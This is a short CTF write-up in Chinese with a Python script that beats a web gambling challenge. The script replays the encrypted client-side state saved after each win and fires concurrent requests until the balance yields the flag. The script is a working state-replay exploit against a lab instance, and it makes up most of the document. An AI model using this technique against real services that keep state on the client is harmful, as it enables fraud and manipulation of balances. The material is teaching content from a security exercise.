# 思路
	- 题目会将加密state储存在浏览器中，无论是赢了一局还是输了一局都会将新的state传给客户端
	- 当前点数存储在state中，如果我们一直尝试，且只保存赢了之后的state, 忽略输了的state，就能一直涨分
	- 可以使用异步请求加速爆破
- # 爆破脚本
	- ```python
	  import requests_html
	  import asyncio
	  from typing import List
	  asession = requests_html.AsyncHTMLSession()
	  url = "http://2f2e344a-ae99-4836-bb30-9ac7c73d2fe3.node4.buuoj.cn:81"
	  
	  async def test(secret_state, balance) -> tuple | None:
	      try:
	          r = await asession.post(f"{url}/api/deal", json = { #type: ignore
	              "Bet": 500,
	              "SecretState": secret_state
	          }, timeout=2)
	      except Exception:
	          await asyncio.sleep(0.1)
	          return None
	      if r.status_code == 429:
	          await asyncio.sleep(0.1)
	          return None
	      data = r.json()
	      return data["SecretState"], data["Balance"], data.get("Flag", None) if data["Balance"] > balance else None
	  
	  
	  async def main():
	      secret_state = "cbc028e73164ddd719667bb66fafa3831defdb0d3ab6fd9362a3021c25877009522c3339915f4f6b0dacbe2c64df0f2696e2ead1ce6c0d410f674f653c6aca0d9a45f5113380fb58e166b9c5bfb478f548994256093f06086caeeb8995b310e3d7a5b16693b0515068c69f16f690f7f152adbcb19b76fce10cc75f5a3e49e139084499445090bf9762da4df73aac351d07f562813df760f194972c3a4fce412a9eec009e12844d010ee782089d92935caf1bbeb321b4f37d2c5efe09dd8ec86d260dd27aeaf7f54bffd37445e2084a6abeee3069aaf69c0cb2c9877cf6f79cd01d85643b43a14037ff87400739fb8e1bf1fa7750da5729485ce9946ba5099c1515182c666da0fd504d617c9d4cac3c20367f19a7bf8682f15f33b69f4007829e1f54de4162a1d51075db8d51ff11dd02be233815babf47fb0e0865d57ee4a61aca9872f6702348ef7ba5e5d9e1ce0a7907aa0982069eeddc097d902fab9d78c41a68a5e4de249ef4e8807a0cd95815aead12f5f9e3d91029cb3024d989a9d1e5e106b576a9d086c90658729d3ca86a9497240d1258264e84b82a3bd3b898d5592075a63ca4cbf9c8d8d314901f6c844ee8018e888eb2d6be8ccfef51a31dbe3fa961f37d74e7a94fa0c1647ecd465cf2950601d51dd6e8dfa5bbc35664aa9ef6876bdc600097ff9f67e70cd774ec226254fd165b654c6651080e2ac6fc49883d894113d9c785329d37c45101c30941aa555c27e6eac05a5e26c1a970ca33ec85e5d82fbc5467c084743946d6cbd46ac67d0ec89946c25de9be20d576bb298041e992d4998a4eb2624769b6e457b0bd19d903136f3d6c7d2cb4ac458a9de0aa3a42fab2c2fb0b5260281bcfd44616540cc8f10f38aab7d83ecaf12c2332e6c43a9750e6457be342828204906cbded29b089261a1efea6fc077b46374d3440b117e35cf5fab1085f476e85df9fbeda0d5092fffd740c11dc9bfd13ad9ccda2d701391ba416023d2f2ed620eeb01126c59ff9cf37eadfbc6124ba6b897602de4e826be9b921a2e43db714556f10d9f95947d40030e5196a82aa2b862fb4888d00c9b25960c9e7e18451670fd613a530ce854f54e10571d539c9450065898e161ff1b3f17ab3e4d71d95d7922719e422f4cf0bbb08c6ed59f1468d89ecdb3a9d1f7c405c7b98cbb97a7812a6edc09fcfec28b6490edff87ce85e1f141135831fbaaa39111d63f2ee88cf2eef650e4723ef8834361dce92dd41668b1ee8e63c4e090757eb43bdb4ec8ba36dbdd76359ee2dda20d3f50dbe09ae4144b6f2e7f7c09dff29d82e059d02f66b5099fbb383204383409df2fb98dc8b6d3ead040fc27676ccd8076d59aabcffdd5230b7a0cb0b4f711c553c77b6034fade2fab6c3cf5d9902828d78d9f6a502d63c6888c9a41b273db036991c58d4ba4e8f300a3b1030cac80e763406b4fb39d3a1167bd46e4a13a5bc229dfe923c3c74f91c1a54efc7a2c90379ab0abccb793025485a057513d820f873527d17abe779b82292e4d150e48127d587742dc4fcc59951d29f8647da7f16de99057abc345e08daa91c3a920a48e460de9f1fbb97b14a88afe6ee522cfc1c1ece3b7e442220754f26f6caf604ee133fd6931ea1e80141e1152e778419fad256046bf3da3aef73e316348d9c3d431f4c85ad08a5b1e5c3a84c7087c82886ec4f09327a9ca54090c59555200e47957ef030cda624c9e02c3c3d847e1d0003bdae88059713fe909f3fabf9221078d3113c8c05306e541fb306b9c70200c615f98c4ad38dddc80bf80c"
	      balance = 0
	      flag = None
	      tasks: List[asyncio.Task] = []
	      while not flag:
	          task = asyncio.Task(test(secret_state, balance))
	          tasks.append(task)
	          done = []
	          while len(tasks) > 8 and not done:
	              done, tasks = [task for task in tasks if task.done()], [task for task in tasks if not task.done()]
	              await asyncio.sleep(0)
	          for task in done:
	              result = await task
	              if result is None or result[1] <= balance:
	                  print(".+*"[hash(str(result[1])) % 3] if result else " ", end = "", flush=True)
	                  continue
	              secret_state, balance, flag = result
	              print(balance)
	          
	          await asyncio.sleep(0.08)
	      print(flag)
	  
	  if __name__ == "__main__":
	      loop = asyncio.get_event_loop()
	      loop.run_until_complete(main())
	  ```